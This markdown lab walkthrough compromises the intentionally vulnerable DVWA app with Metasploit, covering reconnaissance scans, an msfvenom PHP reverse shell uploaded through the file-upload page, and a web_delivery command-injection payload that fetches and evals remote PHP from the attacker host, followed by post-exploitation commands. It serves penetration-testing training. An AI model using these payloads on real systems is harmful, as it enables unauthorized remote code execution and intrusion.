# Web Shells with Metasploit



## LAB TOOLS
- **Testing Tools**: Metasploit (IP: 192.168.127.128)
- **victim**: DVWA ( http://192.168.100.97:8080/ )



# Metasploit For Web shell Methodology

- In this we test with target ``DVWA``: http://192.168.100.97:8080/
<img width="753" height="912" alt="image" src="https://github.com/user-attachments/assets/51492f3d-6a1d-45ed-a6f7-2bf22507ab38" />

## Information Gathering

### Verify Target Accessibility
````
ping -c 4 192.168.100.97
````
<img width="543" height="220" alt="image" src="https://github.com/user-attachments/assets/5c6605b8-9217-4eca-a336-40907e2d4000" />

````
curl -I http://192.168.100.97:8080/
````
<img width="738" height="349" alt="image" src="https://github.com/user-attachments/assets/e9e3ce2c-e4d9-4624-be35-77e6f95eefc7" />


### Network Scanning
````
nmap -sS -sV -O 192.168.100.97 -p 8080
````
<img width="1271" height="401" alt="image" src="https://github.com/user-attachments/assets/462c238c-b72b-487c-aa43-751bcc9e6458" />


````
nmap --script vuln 192.168.100.97 -p 8080
````
<img width="902" height="487" alt="image" src="https://github.com/user-attachments/assets/a84744e0-996f-4408-b385-80f4cde280e1" />


### Web Application Scanning
````
nikto -h http://192.168.100.97:8080/
````
<img width="1908" height="575" alt="image" src="https://github.com/user-attachments/assets/9d68f979-2743-4f80-8df7-5196373629ba" />

- Find directory
````
dirb http://192.168.100.97:8080/ /usr/share/dirb/wordlists/common.txt
````
<img width="663" height="774" alt="image" src="https://github.com/user-attachments/assets/c495ad3f-22ea-4568-8ef4-a8274273e8d8" />


---




## Generate Metasploit Payload for Upload

### Create PHP Meterpreter shell
````
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.127.128 LPORT=4444 -f raw > shell.php
````
<img width="1001" height="143" alt="image" src="https://github.com/user-attachments/assets/a6e37a11-8995-494c-aeb4-41238f4b474c" />

````
ls
cat shell.php
````
<img width="1918" height="262" alt="image" src="https://github.com/user-attachments/assets/b32eab97-5c93-42cc-ad74-468dfcc2a7c5" />



### Start meterpreter handler

````
msfconsole -q
search handler
````
<img width="1874" height="726" alt="image" src="https://github.com/user-attachments/assets/0a39f26b-8a64-4006-a347-d91310ea895f" />

<img width="1907" height="702" alt="image" src="https://github.com/user-attachments/assets/35d138ec-e314-430f-ba46-acd20f6f61e4" />


````
use exploit/multi/handler
show options
````
<img width="948" height="468" alt="image" src="https://github.com/user-attachments/assets/01f63e12-affb-4bd6-bfe5-20dbf573069f" />

````
set payload php/meterpreter/reverse_tcp
set LHOST 192.168.127.128
set LPORT 4444
````
<img width="918" height="511" alt="image" src="https://github.com/user-attachments/assets/5cd89713-17b7-44d0-a4fc-bad7aece915b" />


````
exploit
````
<img width="607" height="84" alt="image" src="https://github.com/user-attachments/assets/9c0beedb-5c3e-4c3b-ae58-6829aff9529d" />

- And go to our target:
<img width="802" height="646" alt="image" src="https://github.com/user-attachments/assets/f7cdd4f0-bab4-4591-a220-56525ddd391b" />

<img width="984" height="755" alt="image" src="https://github.com/user-attachments/assets/d032bda1-3474-46d6-b7b2-de6d7eec4ea6" />

<img width="802" height="643" alt="image" src="https://github.com/user-attachments/assets/d3f463d8-5970-4e17-ba89-9b7cf433c727" />

<img width="797" height="643" alt="image" src="https://github.com/user-attachments/assets/70918d32-6f25-4694-bd5a-f681550df6ff" />


- And open new tab and type this: http://192.168.100.97:8080/hackable/uploads/shell.php?cmd=id
<img width="1919" height="827" alt="image" src="https://github.com/user-attachments/assets/95b45907-67ca-4d04-b002-f2de3bd9caa6" />


- And go back to our `Terminal`:
<img width="1139" height="269" alt="image" src="https://github.com/user-attachments/assets/910f60fd-d5f2-4810-a4e0-81e4ade52e9d" />

- So in this we got the target `meterpreter`:
<img width="760" height="778" alt="image" src="https://github.com/user-attachments/assets/24b43df3-70b4-44d1-8cca-71ac24cfeee8" />

<img width="1078" height="598" alt="image" src="https://github.com/user-attachments/assets/4520d03a-8f66-42d3-abef-ef842ba7de2f" />

---




## USING WEB DELIVERY

### Setup Web Delivery
````
msfconsole -q
search web_delivery
````
<img width="1197" height="518" alt="image" src="https://github.com/user-attachments/assets/df8df856-5515-4925-9a44-749ba1c2c419" />


````
use exploit/multi/script/web_delivery
show options
````
<img width="1387" height="602" alt="image" src="https://github.com/user-attachments/assets/6afdcdb2-c423-4782-93a5-015a4248fb10" />


````
set target 1
set payload php/meterpreter/reverse_tcp
show payloads
````
<img width="1430" height="806" alt="image" src="https://github.com/user-attachments/assets/f7c0d899-0f65-4aa9-a4e1-dc3bf91586dc" />


````
set LHOST 192.168.127.128
set LPORT 4444
show options
````
<img width="1418" height="626" alt="image" src="https://github.com/user-attachments/assets/275eb8bb-2ba5-470f-9a1f-1f28963f4ee0" />


````
set SRVHOST 192.168.127.128
set SRVPORT 8081
show options
````
<img width="1426" height="628" alt="image" src="https://github.com/user-attachments/assets/0382532c-e1f8-46fa-b925-d6c4b5916542" />


````
exploit
````
<img width="1611" height="273" alt="image" src="https://github.com/user-attachments/assets/72b4751a-f2ef-4341-85b4-fd2a82045123" />



### Execute Command
- Go back to our target `Commnand Injection`:
<img width="806" height="648" alt="image" src="https://github.com/user-attachments/assets/d0f1d4be-5920-4c12-8aa8-5a93c20f348d" />


````
127.0.0.1; php -d allow_url_fopen=true -r "eval(file_get_contents('http://192.168.127.128:8081/mysYeeb60f1RfN', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));"
````
<img width="1580" height="835" alt="image" src="https://github.com/user-attachments/assets/19353857-3525-4ce2-8077-90c8bc6bcfd4" />


- After go back to our terminal we will see this:
<img width="1554" height="266" alt="image" src="https://github.com/user-attachments/assets/c8b8f05a-4df9-4f01-8c1d-dc5e86b886a9" />

````
sessions -i 1
````
<img width="1556" height="321" alt="image" src="https://github.com/user-attachments/assets/c0d9769e-1bfa-4a1f-b0dc-a0e7e202b980" />

- Righ now we got the target `Meterpreter`:
<img width="881" height="842" alt="image" src="https://github.com/user-attachments/assets/a5fae34d-6304-457a-9a20-6aaf1792bd02" />

<img width="1109" height="190" alt="image" src="https://github.com/user-attachments/assets/39325060-035d-4226-ac02-fff52a15d857" />

---

## POST-EXPLOITATION WITH WEB SHELL
- After we got shell of target we need to do `Post Exploitation`:

### Basic Commands in Meterpreter

#### Once you have session
````
sysinfo
getuid
pwd
ls
````
<img width="1077" height="399" alt="image" src="https://github.com/user-attachments/assets/30785d61-6e19-4fe5-9fdc-a467cb904927" />



#### System commands
````
shell
whoami
id
uname -a
````
<img width="1021" height="200" alt="image" src="https://github.com/user-attachments/assets/efc17fb9-d9a5-4388-a4f1-607fe1636192" />



---


## finished Of Metasploit for Web Shells


---



---

## Credit By: Nin Kanong (k4n0ng)


----
